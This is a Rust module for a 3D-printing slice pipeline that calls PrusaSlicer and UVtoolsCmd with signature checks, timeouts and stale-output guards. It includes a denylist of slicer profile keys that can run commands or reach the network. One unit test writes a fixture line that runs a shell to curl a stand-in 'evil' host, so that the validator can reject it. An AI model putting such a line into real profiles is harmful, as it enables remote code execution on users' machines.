//! Slice pipeline — external, unmodified CLIs only (AGPL isolation, same doctrine as
//! robotics.rs): PrusaSlicer for FDM gcode and SLA .sl1, UVtoolsCmd for SL1→native resin
//! conversion + post-slice validation (islands / resin traps / suction cups).
//!
//! Resin flow:  model.stl ─PrusaSlicer──▶ part.sl1 ─UVtoolsCmd convert──▶ part.goo/.ctb/.pm7…
//!              └ UVtoolsCmd print-issues part.<ext>  (the authoritative post-slice gate)
//! FDM flow:    model.stl ─PrusaSlicer──▶ part.gcode
//!
//! Exposure/lift settings are NEVER synthesized here — they come from the curated profile .ini
//! the caller passes (UVtools ships per-printer PrusaSlicer profiles embedding the
//! FILEFORMAT_ token that `convert … auto` uses to pick the right native container).

use std::path::{Path, PathBuf};
use std::process::{Command, Stdio};
use std::time::{Duration, Instant};

// PSS: external tools run ONLY from fixed /Applications bundle paths — never a $PATH lookup
// (PATH hijacking) and never a user-writable prefix like /usr/local/bin. The module NEVER
// downloads or installs anything; missing tools produce an instruction to install the OFFICIAL
// build manually (PrusaSlicer from prusa3d.com — Developer ID: Prusa Research; UVtools from
// github.com/sn4k3/UVtools releases). Both are invoked as unmodified external CLIs (AGPL
// isolation) and their code signature is verified before first use each run.
pub const PRUSASLICER: &str = "/Applications/PrusaSlicer.app/Contents/MacOS/PrusaSlicer";
pub const UVTOOLSCMD: &str = "/Applications/UVtools.app/Contents/MacOS/UVtoolsCmd";
const PRUSASLICER_APP: &str = "/Applications/PrusaSlicer.app";
const UVTOOLS_APP: &str = "/Applications/UVtools.app";

/// PSS gate: refuse to execute an external tool whose bundle fails macOS code-signature
/// verification (tamper/substitution guard). `codesign -v` exits 0 for a valid signature.
/// Operators running an unsigned build can consciously override with
/// GINEXUS_FAB_ALLOW_UNSIGNED_TOOLS=1 — the override is loud in the error text otherwise.
fn verify_signature(app_bundle: &str) -> Result<(), String> {
    if std::env::var("GINEXUS_FAB_ALLOW_UNSIGNED_TOOLS").map(|v| v == "1").unwrap_or(false) {
        return Ok(());
    }
    let out = Command::new("/usr/bin/codesign")
        .args(["-v", app_bundle])
        .stdout(Stdio::null())
        .stderr(Stdio::null())
        .status();
    match out {
        Ok(s) if s.success() => Ok(()),
        Ok(_) => Err(format!(
            "{app_bundle} fails code-signature verification — refusing to run it (PSS). \
             Reinstall the official build, or set GINEXUS_FAB_ALLOW_UNSIGNED_TOOLS=1 to \
             consciously accept the risk."
        )),
        Err(e) => Err(format!("cannot verify {app_bundle} signature: {e}")),
    }
}

/// Printer technology drives which pipeline runs.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Tech {
    Fdm,
    Resin,
}

/// Native file extension expected per printer model (verified against UVtools' shipped
/// profiles). The LIVE printer attributes (`SupportFileType`) win over this table when known.
pub fn native_format_for(model: &str) -> (Tech, &'static str) {
    let m = model.to_lowercase();
    if m.contains("centauri") {
        return (Tech::Fdm, "gcode");
    }
    if m.contains("saturn 4 ultra") {
        // Encrypted CTB is the default, but .goo keeps our validators usable — prefer it.
        return (Tech::Resin, "goo");
    }
    if m.contains("saturn 4") || m.contains("mars 5") || m.contains("mars 4") {
        return (Tech::Resin, "goo");
    }
    if m.contains("saturn") || m.contains("mars") {
        return (Tech::Resin, "ctb");
    }
    if m.contains("m7 pro") {
        return (Tech::Resin, "pwsz");
    }
    if m.contains("m7 max") {
        return (Tech::Resin, "pm7m");
    }
    if m.contains("m7") {
        return (Tech::Resin, "pm7");
    }
    if m.contains("photon") {
        return (Tech::Resin, "pwmx");
    }
    // Unknown models default to FDM gcode — the safest wrong answer (fails loudly at upload).
    (Tech::Fdm, "gcode")
}

pub fn uvtools_path() -> Option<&'static str> {
    if Path::new(UVTOOLSCMD).exists() { Some(UVTOOLSCMD) } else { None }
}

pub fn prusaslicer_available() -> bool {
    Path::new(PRUSASLICER).exists()
}

/// PSS preflight for a pipeline step: tool present AND signature-valid.
fn preflight(app: &str, binary: &str, install_hint: &str) -> Result<(), String> {
    if !Path::new(binary).exists() {
        return Err(format!("{install_hint} — GINEXUS never downloads or installs tools itself"));
    }
    verify_signature(app)
}

/// Run a command with a wall-clock timeout (slicing pathological geometry is a DoS vector).
/// stdout/stderr are drained on dedicated threads so a chatty child that fills the ~64 KB pipe
/// buffer can never deadlock (it would otherwise block on write while we block on try_wait,
/// producing a false timeout). On timeout the child is SIGKILLed AND reaped (`wait()`), so no
/// zombie leaks into the long-lived server process table.
fn run_with_timeout(mut cmd: Command, secs: u64) -> Result<std::process::Output, String> {
    use std::io::Read;
    let mut child = cmd
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .map_err(|e| format!("spawn failed: {e}"))?;
    let mut out_pipe = child.stdout.take();
    let mut err_pipe = child.stderr.take();
    let out_h = std::thread::spawn(move || {
        let mut buf = Vec::new();
        if let Some(p) = out_pipe.as_mut() {
            let _ = p.read_to_end(&mut buf);
        }
        buf
    });
    let err_h = std::thread::spawn(move || {
        let mut buf = Vec::new();
        if let Some(p) = err_pipe.as_mut() {
            let _ = p.read_to_end(&mut buf);
        }
        buf
    });
    let start = Instant::now();
    let status = loop {
        match child.try_wait() {
            Ok(Some(s)) => break s,
            Ok(None) => {
                if start.elapsed() > Duration::from_secs(secs) {
                    let _ = child.kill();
                    let _ = child.wait(); // reap the SIGKILLed child — no zombie
                    return Err(format!("timed out after {secs}s"));
                }
                std::thread::sleep(Duration::from_millis(150));
            }
            Err(e) => return Err(format!("wait: {e}")),
        }
    };
    // Pipes closed at exit → the reader threads finish; join collects the full output.
    let stdout = out_h.join().unwrap_or_default();
    let stderr = err_h.join().unwrap_or_default();
    Ok(std::process::Output { status, stdout, stderr })
}

/// Fail unless the tool exited 0 — success is judged by exit code FIRST, then by artifact
/// presence (a stale artifact from a previous run must never be mistaken for this run's output).
fn require_success(out: &std::process::Output, tool: &str) -> Result<(), String> {
    if out.status.success() {
        Ok(())
    } else {
        Err(format!("{tool} exited {}: {}", out.status, stderr_head(out)))
    }
}

fn stderr_head(out: &std::process::Output) -> String {
    String::from_utf8_lossy(&out.stderr).lines().take(4).collect::<Vec<_>>().join(" ")
}

/// Reject a PrusaSlicer config .ini that carries command-execution or network keys — a caller
/// supplies `profile_ini`, and `--load` would otherwise let a hostile profile run
/// `post_process` scripts or POST to a `printhost_*` at slice time (PSS: the slicer is a pure
/// geometry step, never an execution vector). Denylist the known-dangerous keys.
fn validate_profile_ini(profile_ini: &Path) -> Result<(), String> {
    let text = std::fs::read_to_string(profile_ini)
        .map_err(|e| format!("cannot read profile: {e}"))?;
    const DANGEROUS: [&str; 6] =
        ["post_process", "printhost_apikey", "printhost_cafile", "print_host", "printhost_", "host_type"];
    for line in text.lines() {
        let key = line.split('=').next().unwrap_or("").trim().to_lowercase();
        if key.is_empty() || key.starts_with('#') {
            continue;
        }
        if DANGEROUS.iter().any(|d| key == *d || key.starts_with("printhost")) {
            return Err(format!(
                "refusing slicer profile: key '{key}' can execute commands or reach the network \
                 (PSS). Use a clean geometry/exposure profile only."
            ));
        }
    }
    Ok(())
}

/// Delete a stale expected output before running the tool, so success-by-file-presence can never
/// pick up a previous run's artifact (freshness guard, paired with require_success).
fn clear_stale(path: &Path) {
    let _ = std::fs::remove_file(path);
}

/// FDM: STL → gcode. `config_ini` = a full exported PrusaSlicer config for the target printer
/// (profile-name flags need a configured datadir; --load is the robust headless pattern).
pub fn slice_fdm(stl: &Path, config_ini: Option<&Path>, out_dir: &Path) -> Result<PathBuf, String> {
    preflight(PRUSASLICER_APP, PRUSASLICER,
              "PrusaSlicer is not installed — install the official build from prusa3d.com into /Applications")?;
    if let Some(cfg) = config_ini {
        validate_profile_ini(cfg)?;
    }
    std::fs::create_dir_all(out_dir).map_err(|e| format!("workspace: {e}"))?;
    let stem = stl.file_stem().and_then(|s| s.to_str()).unwrap_or("part");
    let gcode = out_dir.join(format!("{stem}.gcode"));
    clear_stale(&gcode);
    let mut cmd = Command::new(PRUSASLICER);
    if let Some(cfg) = config_ini {
        cmd.arg("--load").arg(cfg);
    }
    cmd.arg("--export-gcode").arg(stl).arg("--output").arg(&gcode);
    let out = run_with_timeout(cmd, 300)?;
    require_success(&out, "PrusaSlicer")?;
    if gcode.exists() && std::fs::metadata(&gcode).map(|m| m.len() > 0).unwrap_or(false) {
        Ok(gcode)
    } else {
        Err(format!("slicing produced no G-code: {}", stderr_head(&out)))
    }
}

/// Resin step 1: STL → SL1 zip via PrusaSlicer SLA. The profile .ini MUST be a resin printer
/// profile (e.g. the UVtools-shipped "Elegoo Saturn 4 Ultra.ini") — it carries layer height,
/// exposure, lift, and the FILEFORMAT_ token for auto conversion.
pub fn slice_resin_sl1(stl: &Path, profile_ini: &Path, out_dir: &Path) -> Result<PathBuf, String> {
    preflight(PRUSASLICER_APP, PRUSASLICER,
              "PrusaSlicer is not installed — install the official build from prusa3d.com into /Applications")?;
    if !profile_ini.exists() {
        return Err(format!("resin profile not found: {}", profile_ini.display()));
    }
    validate_profile_ini(profile_ini)?;
    std::fs::create_dir_all(out_dir).map_err(|e| format!("workspace: {e}"))?;
    let stem = stl.file_stem().and_then(|s| s.to_str()).unwrap_or("part");
    let sl1 = out_dir.join(format!("{stem}.sl1"));
    clear_stale(&sl1);
    let mut cmd = Command::new(PRUSASLICER);
    cmd.arg("--load")
        .arg(profile_ini)
        .arg("--export-sla")
        .arg("--printer-technology")
        .arg("SLA")
        .arg(stl)
        .arg("--output")
        .arg(&sl1);
    let out = run_with_timeout(cmd, 600)?;
    require_success(&out, "PrusaSlicer")?;
    if sl1.exists() && std::fs::metadata(&sl1).map(|m| m.len() > 0).unwrap_or(false) {
        Ok(sl1)
    } else {
        Err(format!("SLA slicing produced no SL1: {}", stderr_head(&out)))
    }
}

/// Resin step 2: SL1 → native container. `target_ext` like "goo"/"ctb"/"pm7", or "auto" to let
/// UVtools read the FILEFORMAT_ token from the profile notes.
pub fn convert_sl1(sl1: &Path, target_ext: &str, out_dir: &Path) -> Result<PathBuf, String> {
    preflight(UVTOOLS_APP, UVTOOLSCMD,
              "UVtools is not installed — install the official release from github.com/sn4k3/UVtools into /Applications")?;
    let uv = UVTOOLSCMD;
    std::fs::create_dir_all(out_dir).map_err(|e| format!("workspace: {e}"))?;
    // Freshness fence: only outputs modified after this instant count as THIS conversion's work,
    // so a failed run can never return a previous run's stale native file.
    let started = std::time::SystemTime::now();
    let mut cmd = Command::new(uv);
    cmd.arg("convert").arg(sl1).arg(target_ext).arg(out_dir);
    let out = run_with_timeout(cmd, 600)?;
    require_success(&out, "UVtoolsCmd")?;
    let stem = sl1.file_stem().and_then(|s| s.to_str()).unwrap_or("part").to_string();
    // When target_ext is explicit, match exactly that extension; "auto" accepts any native
    // container (but never .sl1/.stl). Either way, require mtime ≥ conversion start.
    let want_ext = if target_ext == "auto" { None } else { Some(target_ext.to_lowercase()) };
    let found = std::fs::read_dir(out_dir)
        .map_err(|e| format!("read workspace: {e}"))?
        .flatten()
        .map(|e| e.path())
        .filter(|p| {
            let ext = p.extension().and_then(|x| x.to_str()).map(|s| s.to_lowercase());
            let stem_ok = p.file_stem().and_then(|s| s.to_str()) == Some(stem.as_str());
            let ext_ok = match &want_ext {
                Some(w) => ext.as_deref() == Some(w.as_str()),
                None => ext.as_deref() != Some("sl1") && ext.as_deref() != Some("stl"),
            };
            let fresh = std::fs::metadata(p)
                .and_then(|m| m.modified())
                .map(|t| t >= started)
                .unwrap_or(false);
            stem_ok && ext_ok && fresh
        })
        .max_by_key(|p| std::fs::metadata(p).and_then(|m| m.modified()).ok());
    match found {
        Some(p) => Ok(p),
        None => Err(format!(
            "UVtools conversion produced no fresh output: {}",
            stderr_head(&out)
        )),
    }
}

/// Post-slice resin gate: UVtoolsCmd print-issues — islands, resin traps, suction cups.
/// Returns the raw (trimmed) report text; empty/“no issues” output means clean. This can take
/// minutes on 12K files — callers must not run it inline in a UI thread.
pub fn validate_sliced(file: &Path) -> Result<String, String> {
    preflight(UVTOOLS_APP, UVTOOLSCMD,
              "UVtools is not installed — cannot validate the sliced file (install the official release from github.com/sn4k3/UVtools)")?;
    let uv = UVTOOLSCMD;
    let mut cmd = Command::new(uv);
    cmd.arg("print-issues").arg(file);
    let out = run_with_timeout(cmd, 900)?;
    // print-issues exits non-zero when it FINDS issues, so we do NOT require_success here — the
    // issue list is the payload. But a spawn/tool failure still surfaces via empty output below.
    let mut text = String::from_utf8_lossy(&out.stdout).trim().to_string();
    if text.len() > 4000 {
        text.truncate(4000);
        text.push_str("…[truncated]");
    }
    if text.is_empty() {
        text = "no issues reported".into();
    }
    Ok(text)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn format_map_is_sane() {
        assert_eq!(native_format_for("ELEGOO Saturn 4 Ultra"), (Tech::Resin, "goo"));
        assert_eq!(native_format_for("Elegoo Mars 5 Ultra"), (Tech::Resin, "goo"));
        assert_eq!(native_format_for("ELEGOO Saturn 3"), (Tech::Resin, "ctb"));
        assert_eq!(native_format_for("Anycubic Photon Mono M7 Pro"), (Tech::Resin, "pwsz"));
        assert_eq!(native_format_for("Anycubic Photon Mono M7 Max"), (Tech::Resin, "pm7m"));
        assert_eq!(native_format_for("Anycubic Photon Mono M7"), (Tech::Resin, "pm7"));
        assert_eq!(native_format_for("ELEGOO Centauri Carbon"), (Tech::Fdm, "gcode"));
        assert_eq!(native_format_for("Some Unknown Printer"), (Tech::Fdm, "gcode"));
    }

    #[test]
    fn rejects_dangerous_profile_keys() {
        let dir = std::env::temp_dir().join(format!("gx-prof-{}", std::process::id()));
        let _ = std::fs::create_dir_all(&dir);
        let evil = dir.join("evil.ini");
        std::fs::write(&evil, "layer_height = 0.05\npost_process = /bin/sh -c 'curl evil.sh'\n").unwrap();
        let err = validate_profile_ini(&evil).unwrap_err();
        assert!(err.contains("post_process"), "got: {err}");

        let host = dir.join("host.ini");
        std::fs::write(&host, "printhost_apikey = abc\n").unwrap();
        assert!(validate_profile_ini(&host).is_err());

        let clean = dir.join("clean.ini");
        std::fs::write(&clean, "layer_height = 0.05\nexposure_time = 2.5\n# a comment\n").unwrap();
        assert!(validate_profile_ini(&clean).is_ok());
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn run_with_timeout_kills_and_reports() {
        // A sleeper that would run 30s is killed at 1s and reported as a timeout (not a hang).
        let mut cmd = Command::new("/bin/sleep");
        cmd.arg("30");
        let start = Instant::now();
        let r = run_with_timeout(cmd, 1);
        assert!(r.is_err() && r.unwrap_err().contains("timed out"));
        assert!(start.elapsed() < Duration::from_secs(5), "should not have waited the full sleep");
    }

    #[test]
    fn run_with_timeout_captures_exit_and_output() {
        let mut cmd = Command::new("/bin/sh");
        cmd.args(["-c", "echo out; echo err 1>&2; exit 3"]);
        let out = run_with_timeout(cmd, 10).expect("ran");
        assert_eq!(out.status.code(), Some(3));
        assert!(String::from_utf8_lossy(&out.stdout).contains("out"));
        assert!(String::from_utf8_lossy(&out.stderr).contains("err"));
        assert!(require_success(&out, "sh").is_err());
    }

    #[test]
    fn missing_tools_error_cleanly() {
        // These paths exist only when the operator installed the apps — on a bare machine the
        // pipeline must return instructive errors, never panic.
        let stl = std::env::temp_dir().join("gx-pipe-nonexistent.stl");
        if !prusaslicer_available() {
            assert!(slice_fdm(&stl, None, &std::env::temp_dir()).is_err());
        }
        if uvtools_path().is_none() {
            let e = validate_sliced(&stl).unwrap_err();
            assert!(e.contains("UVtools"), "got: {e}");
        }
    }
}
